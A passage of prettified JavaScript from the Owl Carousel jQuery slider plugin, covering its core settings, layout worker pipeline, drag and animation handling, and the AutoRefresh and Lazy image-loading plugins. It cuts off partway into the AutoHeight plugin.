            a.each(e.Plugins, a.proxy(function(a, b) {
                this._plugins[a.charAt(0).toLowerCase() + a.slice(1)] = new b(this)
            }, this)),
            a.each(e.Workers, a.proxy(function(b, c) {
                this._pipe.push({
                    filter: c.filter,
                    run: a.proxy(c.run, this)
                })
            }, this)),
            this.setup(),
            this.initialize()
    }
    e.Defaults = {
        items: 3,
        loop: !1,
        center: !1,
        rewind: !1,
        checkVisibility: !0,
        mouseDrag: !0,
        touchDrag: !0,
        pullDrag: !0,
        freeDrag: !1,
        margin: 0,
        stagePadding: 0,
        merge: !1,
        mergeFit: !0,
        autoWidth: !1,
        startPosition: 0,
        rtl: !1,
        smartSpeed: 250,
        fluidSpeed: !1,
        dragEndSpeed: !1,
        responsive: {},
        responsiveRefreshRate: 200,
        responsiveBaseElement: b,
        fallbackEasing: "swing",
        slideTransition: "",
        info: !1,
        nestedItemSelector: !1,
        itemElement: "div",
        stageElement: "div",
        refreshClass: "owl-refresh",
        loadedClass: "owl-loaded",
        loadingClass: "owl-loading",
        rtlClass: "owl-rtl",
        responsiveClass: "owl-responsive",
        dragClass: "owl-drag",
        itemClass: "owl-item",
        stageClass: "owl-stage",
        stageOuterClass: "owl-stage-outer",
        grabClass: "owl-grab"
    },
        e.Width = {
            Default: "default",
            Inner: "inner",
            Outer: "outer"
        },
        e.Type = {
            Event: "event",
            State: "state"
        },
        e.Plugins = {},
        e.Workers = [{
            filter: ["width", "settings"],
            run: function() {
                this._width = this.$element.width()
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function(a) {
                a.current = this._items && this._items[this.relative(this._current)]
            }
        }, {
            filter: ["items", "settings"],
            run: function() {
                this.$stage.children(".cloned").remove()
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function(a) {
                var b = this.settings.margin || ""
                    , c = !this.settings.autoWidth
                    , d = this.settings.rtl
                    , e = {
                    width: "auto",
                    "margin-left": d ? b : "",
                    "margin-right": d ? "" : b
                };
                !c && this.$stage.children().css(e),
                    a.css = e
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function(a) {
                var b = (this.width() / this.settings.items).toFixed(3) - this.settings.margin
                    , c = null
                    , d = this._items.length
                    , e = !this.settings.autoWidth
                    , f = [];
                for (a.items = {
                    merge: !1,
                    width: b
                }; d--; )
                    c = this._mergers[d],
                        c = this.settings.mergeFit && Math.min(c, this.settings.items) || c,
                        a.items.merge = c > 1 || a.items.merge,
                        f[d] = e ? b * c : this._items[d].width();
                this._widths = f
            }
        }, {
            filter: ["items", "settings"],
            run: function() {
                var b = []
                    , c = this._items
                    , d = this.settings
                    , e = Math.max(2 * d.items, 4)
                    , f = 2 * Math.ceil(c.length / 2)
                    , g = d.loop && c.length ? d.rewind ? e : Math.max(e, f) : 0
                    , h = ""
                    , i = "";
                for (g /= 2; g > 0; )
                    b.push(this.normalize(b.length / 2, !0)),
                        h += c[b[b.length - 1]][0].outerHTML,
                        b.push(this.normalize(c.length - 1 - (b.length - 1) / 2, !0)),
                        i = c[b[b.length - 1]][0].outerHTML + i,
                        g -= 1;
                this._clones = b,
                    a(h).addClass("cloned").appendTo(this.$stage),
                    a(i).addClass("cloned").prependTo(this.$stage)
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function() {
                for (var a = this.settings.rtl ? 1 : -1, b = this._clones.length + this._items.length, c = -1, d = 0, e = 0, f = []; ++c < b; )
                    d = f[c - 1] || 0,
                        e = this._widths[this.relative(c)] + this.settings.margin,
                        f.push(d + e * a);
                this._coordinates = f
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function() {
                var a = this.settings.stagePadding
                    , b = this._coordinates
                    , c = {
                    width: Math.ceil(Math.abs(b[b.length - 1])) + 2 * a,
                    "padding-left": a || "",
                    "padding-right": a || ""
                };
                this.$stage.css(c)
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function(a) {
                var b = this._coordinates.length
                    , c = !this.settings.autoWidth
                    , d = this.$stage.children();
                if (c && a.items.merge)
                    for (; b--; )
                        a.css.width = this._widths[this.relative(b)],
                            d.eq(b).css(a.css);
                else
                    c && (a.css.width = a.items.width,
                        d.css(a.css))
            }
        }, {
            filter: ["items"],
            run: function() {
                this._coordinates.length < 1 && this.$stage.removeAttr("style")
            }
        }, {
            filter: ["width", "items", "settings"],
            run: function(a) {
                a.current = a.current ? this.$stage.children().index(a.current) : 0,
                    a.current = Math.max(this.minimum(), Math.min(this.maximum(), a.current)),
                    this.reset(a.current)
            }
        }, {
            filter: ["position"],
            run: function() {
                this.animate(this.coordinates(this._current))
            }
        }, {
            filter: ["width", "position", "items", "settings"],
            run: function() {
                var a, b, c, d, e = this.settings.rtl ? 1 : -1, f = 2 * this.settings.stagePadding, g = this.coordinates(this.current()) + f, h = g + this.width() * e, i = [];
                for (c = 0,
                         d = this._coordinates.length; c < d; c++)
                    a = this._coordinates[c - 1] || 0,
                        b = Math.abs(this._coordinates[c]) + f * e,
                    (this.op(a, "<=", g) && this.op(a, ">", h) || this.op(b, "<", g) && this.op(b, ">", h)) && i.push(c);
                this.$stage.children(".active").removeClass("active"),
                    this.$stage.children(":eq(" + i.join("), :eq(") + ")").addClass("active"),
                    this.$stage.children(".center").removeClass("center"),
                this.settings.center && this.$stage.children().eq(this.current()).addClass("center")
            }
        }],
        e.prototype.initializeStage = function() {
            this.$stage = this.$element.find("." + this.settings.stageClass),
            this.$stage.length || (this.$element.addClass(this.options.loadingClass),
                this.$stage = a("<" + this.settings.stageElement + ">", {
                    class: this.settings.stageClass
                }).wrap(a("<div/>", {
                    class: this.settings.stageOuterClass
                })),
                this.$element.append(this.$stage.parent()))
        }
        ,
        e.prototype.initializeItems = function() {
            var b = this.$element.find(".owl-item");
            if (b.length)
                return this._items = b.get().map(function(b) {
                    return a(b)
                }),
                    this._mergers = this._items.map(function() {
                        return 1
                    }),
                    void this.refresh();
            this.replace(this.$element.children().not(this.$stage.parent())),
                this.isVisible() ? this.refresh() : this.invalidate("width"),
                this.$element.removeClass(this.options.loadingClass).addClass(this.options.loadedClass)
        }
        ,
        e.prototype.initialize = function() {
            if (this.enter("initializing"),
                this.trigger("initialize"),
                this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl),
            this.settings.autoWidth && !this.is("pre-loading")) {
                var a, b, c;
                a = this.$element.find("img"),
                    b = this.settings.nestedItemSelector ? "." + this.settings.nestedItemSelector : d,
                    c = this.$element.children(b).width(),
                a.length && c <= 0 && this.preloadAutoWidthImages(a)
            }
            this.initializeStage(),
                this.initializeItems(),
                this.registerEventHandlers(),
                this.leave("initializing"),
                this.trigger("initialized")
        }
        ,
        e.prototype.isVisible = function() {
            return !this.settings.checkVisibility || this.$element.is(":visible")
        }
        ,
        e.prototype.setup = function() {
            var b = this.viewport()
                , c = this.options.responsive
                , d = -1
                , e = null;
            c ? (a.each(c, function(a) {
                a <= b && a > d && (d = Number(a))
            }),
                e = a.extend({}, this.options, c[d]),
            "function" == typeof e.stagePadding && (e.stagePadding = e.stagePadding()),
                delete e.responsive,
            e.responsiveClass && this.$element.attr("class", this.$element.attr("class").replace(new RegExp("(" + this.options.responsiveClass + "-)\\S+\\s","g"), "$1" + d))) : e = a.extend({}, this.options),
                this.trigger("change", {
                    property: {
                        name: "settings",
                        value: e
                    }
                }),
                this._breakpoint = d,
                this.settings = e,
                this.invalidate("settings"),
                this.trigger("changed", {
                    property: {
                        name: "settings",
                        value: this.settings
                    }
                })
        }
        ,
        e.prototype.optionsLogic = function() {
            this.settings.autoWidth && (this.settings.stagePadding = !1,
                this.settings.merge = !1)
        }
        ,
        e.prototype.prepare = function(b) {
            var c = this.trigger("prepare", {
                content: b
            });
            return c.data || (c.data = a("<" + this.settings.itemElement + "/>").addClass(this.options.itemClass).append(b)),
                this.trigger("prepared", {
                    content: c.data
                }),
                c.data
        }
        ,
        e.prototype.update = function() {
            for (var b = 0, c = this._pipe.length, d = a.proxy(function(a) {
                return this[a]
            }, this._invalidated), e = {}; b < c; )
                (this._invalidated.all || a.grep(this._pipe[b].filter, d).length > 0) && this._pipe[b].run(e),
                    b++;
            this._invalidated = {},
            !this.is("valid") && this.enter("valid")
        }
        ,
        e.prototype.width = function(a) {
            switch (a = a || e.Width.Default) {
                case e.Width.Inner:
                case e.Width.Outer:
                    return this._width;
                default:
                    return this._width - 2 * this.settings.stagePadding + this.settings.margin
            }
        }
        ,
        e.prototype.refresh = function() {
            this.enter("refreshing"),
                this.trigger("refresh"),
                this.setup(),
                this.optionsLogic(),
                this.$element.addClass(this.options.refreshClass),
                this.update(),
                this.$element.removeClass(this.options.refreshClass),
                this.leave("refreshing"),
                this.trigger("refreshed")
        }
        ,
        e.prototype.onThrottledResize = function() {
            b.clearTimeout(this.resizeTimer),
                this.resizeTimer = b.setTimeout(this._handlers.onResize, this.settings.responsiveRefreshRate)
        }
        ,
        e.prototype.onResize = function() {
            return !!this._items.length && (this._width !== this.$element.width() && (!!this.isVisible() && (this.enter("resizing"),
                this.trigger("resize").isDefaultPrevented() ? (this.leave("resizing"),
                    !1) : (this.invalidate("width"),
                    this.refresh(),
                    this.leave("resizing"),
                    void this.trigger("resized")))))
        }
        ,
        e.prototype.registerEventHandlers = function() {
            a.support.transition && this.$stage.on(a.support.transition.end + ".owl.core", a.proxy(this.onTransitionEnd, this)),
            !1 !== this.settings.responsive && this.on(b, "resize", this._handlers.onThrottledResize),
            this.settings.mouseDrag && (this.$element.addClass(this.options.dragClass),
                this.$stage.on("mousedown.owl.core", a.proxy(this.onDragStart, this)),
                this.$stage.on("dragstart.owl.core selectstart.owl.core", function() {
                    return !1
                })),
            this.settings.touchDrag && (this.$stage.on("touchstart.owl.core", a.proxy(this.onDragStart, this)),
                this.$stage.on("touchcancel.owl.core", a.proxy(this.onDragEnd, this)))
        }
        ,
        e.prototype.onDragStart = function(b) {
            var d = null;
            3 !== b.which && (a.support.transform ? (d = this.$stage.css("transform").replace(/.*\(|\)| /g, "").split(","),
                d = {
                    x: d[16 === d.length ? 12 : 4],
                    y: d[16 === d.length ? 13 : 5]
                }) : (d = this.$stage.position(),
                d = {
                    x: this.settings.rtl ? d.left + this.$stage.width() - this.width() + this.settings.margin : d.left,
                    y: d.top
                }),
            this.is("animating") && (a.support.transform ? this.animate(d.x) : this.$stage.stop(),
                this.invalidate("position")),
                this.$element.toggleClass(this.options.grabClass, "mousedown" === b.type),
                this.speed(0),
                this._drag.time = (new Date).getTime(),
                this._drag.target = a(b.target),
                this._drag.stage.start = d,
                this._drag.stage.current = d,
                this._drag.pointer = this.pointer(b),
                a(c).on("mouseup.owl.core touchend.owl.core", a.proxy(this.onDragEnd, this)),
                a(c).one("mousemove.owl.core touchmove.owl.core", a.proxy(function(b) {
                    var d = this.difference(this._drag.pointer, this.pointer(b));
                    a(c).on("mousemove.owl.core touchmove.owl.core", a.proxy(this.onDragMove, this)),
                    Math.abs(d.x) < Math.abs(d.y) && this.is("valid") || (b.preventDefault(),
                        this.enter("dragging"),
                        this.trigger("drag"))
                }, this)))
        }
        ,
        e.prototype.onDragMove = function(a) {
            var b = null
                , c = null
                , d = null
                , e = this.difference(this._drag.pointer, this.pointer(a))
                , f = this.difference(this._drag.stage.start, e);
            this.is("dragging") && (a.preventDefault(),
                this.settings.loop ? (b = this.coordinates(this.minimum()),
                    c = this.coordinates(this.maximum() + 1) - b,
                    f.x = ((f.x - b) % c + c) % c + b) : (b = this.settings.rtl ? this.coordinates(this.maximum()) : this.coordinates(this.minimum()),
                    c = this.settings.rtl ? this.coordinates(this.minimum()) : this.coordinates(this.maximum()),
                    d = this.settings.pullDrag ? -1 * e.x / 5 : 0,
                    f.x = Math.max(Math.min(f.x, b + d), c + d)),
                this._drag.stage.current = f,
                this.animate(f.x))
        }
        ,
        e.prototype.onDragEnd = function(b) {
            var d = this.difference(this._drag.pointer, this.pointer(b))
                , e = this._drag.stage.current
                , f = d.x > 0 ^ this.settings.rtl ? "left" : "right";
            a(c).off(".owl.core"),
                this.$element.removeClass(this.options.grabClass),
            (0 !== d.x && this.is("dragging") || !this.is("valid")) && (this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed),
                this.current(this.closest(e.x, 0 !== d.x ? f : this._drag.direction)),
                this.invalidate("position"),
                this.update(),
                this._drag.direction = f,
            (Math.abs(d.x) > 3 || (new Date).getTime() - this._drag.time > 300) && this._drag.target.one("click.owl.core", function() {
                return !1
            })),
            this.is("dragging") && (this.leave("dragging"),
                this.trigger("dragged"))
        }
        ,
        e.prototype.closest = function(b, c) {
            var e = -1
                , f = 30
                , g = this.width()
                , h = this.coordinates();
            return this.settings.freeDrag || a.each(h, a.proxy(function(a, i) {
                return "left" === c && b > i - f && b < i + f ? e = a : "right" === c && b > i - g - f && b < i - g + f ? e = a + 1 : this.op(b, "<", i) && this.op(b, ">", h[a + 1] !== d ? h[a + 1] : i - g) && (e = "left" === c ? a + 1 : a),
                -1 === e
            }, this)),
            this.settings.loop || (this.op(b, ">", h[this.minimum()]) ? e = b = this.minimum() : this.op(b, "<", h[this.maximum()]) && (e = b = this.maximum())),
                e
        }
        ,
        e.prototype.animate = function(b) {
            var c = this.speed() > 0;
            this.is("animating") && this.onTransitionEnd(),
            c && (this.enter("animating"),
                this.trigger("translate")),
                a.support.transform3d && a.support.transition ? this.$stage.css({
                    transform: "translate3d(" + b + "px,0px,0px)",
                    transition: this.speed() / 1e3 + "s" + (this.settings.slideTransition ? " " + this.settings.slideTransition : "")
                }) : c ? this.$stage.animate({
                    left: b + "px"
                }, this.speed(), this.settings.fallbackEasing, a.proxy(this.onTransitionEnd, this)) : this.$stage.css({
                    left: b + "px"
                })
        }
        ,
        e.prototype.is = function(a) {
            return this._states.current[a] && this._states.current[a] > 0
        }
        ,
        e.prototype.current = function(a) {
            if (a === d)
                return this._current;
            if (0 === this._items.length)
                return d;
            if (a = this.normalize(a),
            this._current !== a) {
                var b = this.trigger("change", {
                    property: {
                        name: "position",
                        value: a
                    }
                });
                b.data !== d && (a = this.normalize(b.data)),
                    this._current = a,
                    this.invalidate("position"),
                    this.trigger("changed", {
                        property: {
                            name: "position",
                            value: this._current
                        }
                    })
            }
            return this._current
        }
        ,
        e.prototype.invalidate = function(b) {
            return "string" === a.type(b) && (this._invalidated[b] = !0,
            this.is("valid") && this.leave("valid")),
                a.map(this._invalidated, function(a, b) {
                    return b
                })
        }
        ,
        e.prototype.reset = function(a) {
            (a = this.normalize(a)) !== d && (this._speed = 0,
                this._current = a,
                this.suppress(["translate", "translated"]),
                this.animate(this.coordinates(a)),
                this.release(["translate", "translated"]))
        }
        ,
        e.prototype.normalize = function(a, b) {
            var c = this._items.length
                , e = b ? 0 : this._clones.length;
            return !this.isNumeric(a) || c < 1 ? a = d : (a < 0 || a >= c + e) && (a = ((a - e / 2) % c + c) % c + e / 2),
                a
        }
        ,
        e.prototype.relative = function(a) {
            return a -= this._clones.length / 2,
                this.normalize(a, !0)
        }
        ,
        e.prototype.maximum = function(a) {
            var b, c, d, e = this.settings, f = this._coordinates.length;
            if (e.loop)
                f = this._clones.length / 2 + this._items.length - 1;
            else if (e.autoWidth || e.merge) {
                if (b = this._items.length)
                    for (c = this._items[--b].width(),
                             d = this.$element.width(); b-- && !((c += this._items[b].width() + this.settings.margin) > d); )
                        ;
                f = b + 1
            } else
                f = e.center ? this._items.length - 1 : this._items.length - e.items;
            return a && (f -= this._clones.length / 2),
                Math.max(f, 0)
        }
        ,
        e.prototype.minimum = function(a) {
            return a ? 0 : this._clones.length / 2
        }
        ,
        e.prototype.items = function(a) {
            return a === d ? this._items.slice() : (a = this.normalize(a, !0),
                this._items[a])
        }
        ,
        e.prototype.mergers = function(a) {
            return a === d ? this._mergers.slice() : (a = this.normalize(a, !0),
                this._mergers[a])
        }
        ,
        e.prototype.clones = function(b) {
            var c = this._clones.length / 2
                , e = c + this._items.length
                , f = function(a) {
                return a % 2 == 0 ? e + a / 2 : c - (a + 1) / 2
            };
            return b === d ? a.map(this._clones, function(a, b) {
                return f(b)
            }) : a.map(this._clones, function(a, c) {
                return a === b ? f(c) : null
            })
        }
        ,
        e.prototype.speed = function(a) {
            return a !== d && (this._speed = a),
                this._speed
        }
        ,
        e.prototype.coordinates = function(b) {
            var c, e = 1, f = b - 1;
            return b === d ? a.map(this._coordinates, a.proxy(function(a, b) {
                return this.coordinates(b)
            }, this)) : (this.settings.center ? (this.settings.rtl && (e = -1,
                f = b + 1),
                c = this._coordinates[b],
                c += (this.width() - c + (this._coordinates[f] || 0)) / 2 * e) : c = this._coordinates[f] || 0,
                c = Math.ceil(c))
        }
        ,
        e.prototype.duration = function(a, b, c) {
            return 0 === c ? 0 : Math.min(Math.max(Math.abs(b - a), 1), 6) * Math.abs(c || this.settings.smartSpeed)
        }
        ,
        e.prototype.to = function(a, b) {
            var c = this.current()
                , d = null
                , e = a - this.relative(c)
                , f = (e > 0) - (e < 0)
                , g = this._items.length
                , h = this.minimum()
                , i = this.maximum();
            this.settings.loop ? (!this.settings.rewind && Math.abs(e) > g / 2 && (e += -1 * f * g),
                a = c + e,
            (d = ((a - h) % g + g) % g + h) !== a && d - e <= i && d - e > 0 && (c = d - e,
                a = d,
                this.reset(c))) : this.settings.rewind ? (i += 1,
                a = (a % i + i) % i) : a = Math.max(h, Math.min(i, a)),
                this.speed(this.duration(c, a, b)),
                this.current(a),
            this.isVisible() && this.update()
        }
        ,
        e.prototype.next = function(a) {
            a = a || !1,
                this.to(this.relative(this.current()) + 1, a)
        }
        ,
        e.prototype.prev = function(a) {
            a = a || !1,
                this.to(this.relative(this.current()) - 1, a)
        }
        ,
        e.prototype.onTransitionEnd = function(a) {
            if (a !== d && (a.stopPropagation(),
            (a.target || a.srcElement || a.originalTarget) !== this.$stage.get(0)))
                return !1;
            this.leave("animating"),
                this.trigger("translated")
        }
        ,
        e.prototype.viewport = function() {
            var d;
            return this.options.responsiveBaseElement !== b ? d = a(this.options.responsiveBaseElement).width() : b.innerWidth ? d = b.innerWidth : c.documentElement && c.documentElement.clientWidth ? d = c.documentElement.clientWidth : console.warn("Can not detect viewport width."),
                d
        }
        ,
        e.prototype.replace = function(b) {
            this.$stage.empty(),
                this._items = [],
            b && (b = b instanceof jQuery ? b : a(b)),
            this.settings.nestedItemSelector && (b = b.find("." + this.settings.nestedItemSelector)),
                b.filter(function() {
                    return 1 === this.nodeType
                }).each(a.proxy(function(a, b) {
                    b = this.prepare(b),
                        this.$stage.append(b),
                        this._items.push(b),
                        this._mergers.push(1 * b.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)
                }, this)),
                this.reset(this.isNumeric(this.settings.startPosition) ? this.settings.startPosition : 0),
                this.invalidate("items")
        }
        ,
        e.prototype.add = function(b, c) {
            var e = this.relative(this._current);
            c = c === d ? this._items.length : this.normalize(c, !0),
                b = b instanceof jQuery ? b : a(b),
                this.trigger("add", {
                    content: b,
                    position: c
                }),
                b = this.prepare(b),
                0 === this._items.length || c === this._items.length ? (0 === this._items.length && this.$stage.append(b),
                0 !== this._items.length && this._items[c - 1].after(b),
                    this._items.push(b),
                    this._mergers.push(1 * b.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)) : (this._items[c].before(b),
                    this._items.splice(c, 0, b),
                    this._mergers.splice(c, 0, 1 * b.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)),
            this._items[e] && this.reset(this._items[e].index()),
                this.invalidate("items"),
                this.trigger("added", {
                    content: b,
                    position: c
                })
        }
        ,
        e.prototype.remove = function(a) {
            (a = this.normalize(a, !0)) !== d && (this.trigger("remove", {
                content: this._items[a],
                position: a
            }),
                this._items[a].remove(),
                this._items.splice(a, 1),
                this._mergers.splice(a, 1),
                this.invalidate("items"),
                this.trigger("removed", {
                    content: null,
                    position: a
                }))
        }
        ,
        e.prototype.preloadAutoWidthImages = function(b) {
            b.each(a.proxy(function(b, c) {
                this.enter("pre-loading"),
                    c = a(c),
                    a(new Image).one("load", a.proxy(function(a) {
                        c.attr("src", a.target.src),
                            c.css("opacity", 1),
                            this.leave("pre-loading"),
                        !this.is("pre-loading") && !this.is("initializing") && this.refresh()
                    }, this)).attr("src", c.attr("src") || c.attr("data-src") || c.attr("data-src-retina"))
            }, this))
        }
        ,
        e.prototype.destroy = function() {
            this.$element.off(".owl.core"),
                this.$stage.off(".owl.core"),
                a(c).off(".owl.core"),
            !1 !== this.settings.responsive && (b.clearTimeout(this.resizeTimer),
                this.off(b, "resize", this._handlers.onThrottledResize));
            for (var d in this._plugins)
                this._plugins[d].destroy();
            this.$stage.children(".cloned").remove(),
                this.$stage.unwrap(),
                this.$stage.children().contents().unwrap(),
                this.$stage.children().unwrap(),
                this.$stage.remove(),
                this.$element.removeClass(this.options.refreshClass).removeClass(this.options.loadingClass).removeClass(this.options.loadedClass).removeClass(this.options.rtlClass).removeClass(this.options.dragClass).removeClass(this.options.grabClass).attr("class", this.$element.attr("class").replace(new RegExp(this.options.responsiveClass + "-\\S+\\s","g"), "")).removeData("owl.carousel")
        }
        ,
        e.prototype.op = function(a, b, c) {
            var d = this.settings.rtl;
            switch (b) {
                case "<":
                    return d ? a > c : a < c;
                case ">":
                    return d ? a < c : a > c;
                case ">=":
                    return d ? a <= c : a >= c;
                case "<=":
                    return d ? a >= c : a <= c
            }
        }
        ,
        e.prototype.on = function(a, b, c, d) {
            a.addEventListener ? a.addEventListener(b, c, d) : a.attachEvent && a.attachEvent("on" + b, c)
        }
        ,
        e.prototype.off = function(a, b, c, d) {
            a.removeEventListener ? a.removeEventListener(b, c, d) : a.detachEvent && a.detachEvent("on" + b, c)
        }
        ,
        e.prototype.trigger = function(b, c, d, f, g) {
            var h = {
                item: {
                    count: this._items.length,
                    index: this.current()
                }
            }
                , i = a.camelCase(a.grep(["on", b, d], function(a) {
                return a
            }).join("-").toLowerCase())
                , j = a.Event([b, "owl", d || "carousel"].join(".").toLowerCase(), a.extend({
                relatedTarget: this
            }, h, c));
            return this._supress[b] || (a.each(this._plugins, function(a, b) {
                b.onTrigger && b.onTrigger(j)
            }),
                this.register({
                    type: e.Type.Event,
                    name: b
                }),
                this.$element.trigger(j),
            this.settings && "function" == typeof this.settings[i] && this.settings[i].call(this, j)),
                j
        }
        ,
        e.prototype.enter = function(b) {
            a.each([b].concat(this._states.tags[b] || []), a.proxy(function(a, b) {
                this._states.current[b] === d && (this._states.current[b] = 0),
                    this._states.current[b]++
            }, this))
        }
        ,
        e.prototype.leave = function(b) {
            a.each([b].concat(this._states.tags[b] || []), a.proxy(function(a, b) {
                this._states.current[b]--
            }, this))
        }
        ,
        e.prototype.register = function(b) {
            if (b.type === e.Type.Event) {
                if (a.event.special[b.name] || (a.event.special[b.name] = {}),
                    !a.event.special[b.name].owl) {
                    var c = a.event.special[b.name]._default;
                    a.event.special[b.name]._default = function(a) {
                        return !c || !c.apply || a.namespace && -1 !== a.namespace.indexOf("owl") ? a.namespace && a.namespace.indexOf("owl") > -1 : c.apply(this, arguments)
                    }
                        ,
                        a.event.special[b.name].owl = !0
                }
            } else
                b.type === e.Type.State && (this._states.tags[b.name] ? this._states.tags[b.name] = this._states.tags[b.name].concat(b.tags) : this._states.tags[b.name] = b.tags,
                    this._states.tags[b.name] = a.grep(this._states.tags[b.name], a.proxy(function(c, d) {
                        return a.inArray(c, this._states.tags[b.name]) === d
                    }, this)))
        }
        ,
        e.prototype.suppress = function(b) {
            a.each(b, a.proxy(function(a, b) {
                this._supress[b] = !0
            }, this))
        }
        ,
        e.prototype.release = function(b) {
            a.each(b, a.proxy(function(a, b) {
                delete this._supress[b]
            }, this))
        }
        ,
        e.prototype.pointer = function(a) {
            var c = {
                x: null,
                y: null
            };
            return a = a.originalEvent || a || b.event,
                a = a.touches && a.touches.length ? a.touches[0] : a.changedTouches && a.changedTouches.length ? a.changedTouches[0] : a,
                a.pageX ? (c.x = a.pageX,
                    c.y = a.pageY) : (c.x = a.clientX,
                    c.y = a.clientY),
                c
        }
        ,
        e.prototype.isNumeric = function(a) {
            return !isNaN(parseFloat(a))
        }
        ,
        e.prototype.difference = function(a, b) {
            return {
                x: a.x - b.x,
                y: a.y - b.y
            }
        }
        ,
        a.fn.owlCarousel = function(b) {
            var c = Array.prototype.slice.call(arguments, 1);
            return this.each(function() {
                var d = a(this)
                    , f = d.data("owl.carousel");
                f || (f = new e(this,"object" == typeof b && b),
                    d.data("owl.carousel", f),
                    a.each(["next", "prev", "to", "destroy", "refresh", "replace", "add", "remove"], function(b, c) {
                        f.register({
                            type: e.Type.Event,
                            name: c
                        }),
                            f.$element.on(c + ".owl.carousel.core", a.proxy(function(a) {
                                a.namespace && a.relatedTarget !== this && (this.suppress([c]),
                                    f[c].apply(this, [].slice.call(arguments, 1)),
                                    this.release([c]))
                            }, f))
                    })),
                "string" == typeof b && "_" !== b.charAt(0) && f[b].apply(f, c)
            })
        }
        ,
        a.fn.owlCarousel.Constructor = e
}(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        var e = function(b) {
            this._core = b,
                this._interval = null,
                this._visible = null,
                this._handlers = {
                    "initialized.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.autoRefresh && this.watch()
                    }, this)
                },
                this._core.options = a.extend({}, e.Defaults, this._core.options),
                this._core.$element.on(this._handlers)
        };
        e.Defaults = {
            autoRefresh: !0,
            autoRefreshInterval: 500
        },
            e.prototype.watch = function() {
                this._interval || (this._visible = this._core.isVisible(),
                    this._interval = b.setInterval(a.proxy(this.refresh, this), this._core.settings.autoRefreshInterval))
            }
            ,
            e.prototype.refresh = function() {
                this._core.isVisible() !== this._visible && (this._visible = !this._visible,
                    this._core.$element.toggleClass("owl-hidden", !this._visible),
                this._visible && this._core.invalidate("width") && this._core.refresh())
            }
            ,
            e.prototype.destroy = function() {
                var a, c;
                b.clearInterval(this._interval);
                for (a in this._handlers)
                    this._core.$element.off(a, this._handlers[a]);
                for (c in Object.getOwnPropertyNames(this))
                    "function" != typeof this[c] && (this[c] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.AutoRefresh = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        var e = function(b) {
            this._core = b,
                this._loaded = [],
                this._handlers = {
                    "initialized.owl.carousel change.owl.carousel resized.owl.carousel": a.proxy(function(b) {
                        if (b.namespace && this._core.settings && this._core.settings.lazyLoad && (b.property && "position" == b.property.name || "initialized" == b.type)) {
                            var c = this._core.settings
                                , e = c.center && Math.ceil(c.items / 2) || c.items
                                , f = c.center && -1 * e || 0
                                , g = (b.property && b.property.value !== d ? b.property.value : this._core.current()) + f
                                , h = this._core.clones().length
                                , i = a.proxy(function(a, b) {
                                this.load(b)
                            }, this);
                            for (c.lazyLoadEager > 0 && (e += c.lazyLoadEager,
                            c.loop && (g -= c.lazyLoadEager,
                                e++)); f++ < e; )
                                this.load(h / 2 + this._core.relative(g)),
                                h && a.each(this._core.clones(this._core.relative(g)), i),
                                    g++
                        }
                    }, this)
                },
                this._core.options = a.extend({}, e.Defaults, this._core.options),
                this._core.$element.on(this._handlers)
        };
        e.Defaults = {
            lazyLoad: !1,
            lazyLoadEager: 0
        },
            e.prototype.load = function(c) {
                var d = this._core.$stage.children().eq(c)
                    , e = d && d.find(".owl-lazy");
                !e || a.inArray(d.get(0), this._loaded) > -1 || (e.each(a.proxy(function(c, d) {
                    var e, f = a(d), g = b.devicePixelRatio > 1 && f.attr("data-src-retina") || f.attr("data-src") || f.attr("data-srcset");
                    this._core.trigger("load", {
                        element: f,
                        url: g
                    }, "lazy"),
                        f.is("img") ? f.one("load.owl.lazy", a.proxy(function() {
                            f.css("opacity", 1),
                                this._core.trigger("loaded", {
                                    element: f,
                                    url: g
                                }, "lazy")
                        }, this)).attr("src", g) : f.is("source") ? f.one("load.owl.lazy", a.proxy(function() {
                            this._core.trigger("loaded", {
                                element: f,
                                url: g
                            }, "lazy")
                        }, this)).attr("srcset", g) : (e = new Image,
                            e.onload = a.proxy(function() {
                                f.css({
                                    "background-image": 'url("' + g + '")',
                                    opacity: "1"
                                }),
                                    this._core.trigger("loaded", {
                                        element: f,
                                        url: g
                                    }, "lazy")
                            }, this),
                            e.src = g)
                }, this)),
                    this._loaded.push(d.get(0)))
            }
            ,
            e.prototype.destroy = function() {
                var a, b;
                for (a in this.handlers)
                    this._core.$element.off(a, this.handlers[a]);
                for (b in Object.getOwnPropertyNames(this))
                    "function" != typeof this[b] && (this[b] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.Lazy = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        var e = function(c) {
            this._core = c,
                this._previousHeight = null,
                this._handlers = {
                    "initialized.owl.carousel refreshed.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.autoHeight && this.update()
                    }, this),
                    "changed.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.autoHeight && "position" === a.property.name && this.update()
                    }, this),
                    "loaded.owl.lazy": a.proxy(function(a) {
                        a.namespace && this._core.settings.autoHeight && a.element.closest("." + this._core.settings.itemClass).index() === this._core.current() && this.update()
                    }, this)
                },
                this._core.options = a.extend({}, e.Defaults, this._core.options),
                this._core.$element.on(this._handlers),
                this._intervalId = null;
            var d = this;
            a(b).on("load", function() {
                d._core.settings.autoHeight && d.update()
            }),
                a(b).resize(function() {
                    d._core.settings.autoHeight && (null != d._intervalId && clearTimeout(d._intervalId),
                        d._intervalId = setTimeout(function() {
                            d.update()
                        }, 250))
                })
        };
        e.Defaults = {
            autoHeight: !1,
            autoHeightClass: "owl-height"
        },
            e.prototype.update = function() {
                var b = this._core._current
                    , c = b + this._core.settings.items
                    , d = this._core.settings.lazyLoad
                    , e = this._core.$stage.children().toArray().slice(b, c)
                    , f = []
                    , g = 0;
